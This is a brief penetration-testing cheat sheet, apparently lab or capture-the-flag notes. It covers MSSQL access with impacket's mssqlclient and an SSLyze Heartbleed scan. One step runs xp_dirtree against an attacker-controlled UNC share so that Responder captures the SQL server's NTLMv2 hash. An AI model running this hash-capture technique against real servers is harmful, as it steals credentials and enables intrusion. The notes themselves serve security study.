# Misc Services Enumeration & Attack
[TOC]
###### tags: `Security` `Recon` `MSSQL` `SSL`

# MSSQL
Use impacket python script as client
```
python3 mssqlclient.py reporting@10.10.10.125 -windows-auth
```
### Get NTLMv2-SSP Hash
```
SQL> xp_dirtree "\\10.10.14.42\WildfootW\"
```
Then we can get Hash in `Responder`
![](https://i.imgur.com/I0Vb4mW.png)

# SSL/TLS
### SSLyze
[GitHub](https://github.com/nabla-c0d3/sslyze)
SSL/TLS server scanning
```
sslyze --heartbleed valentine.htb
```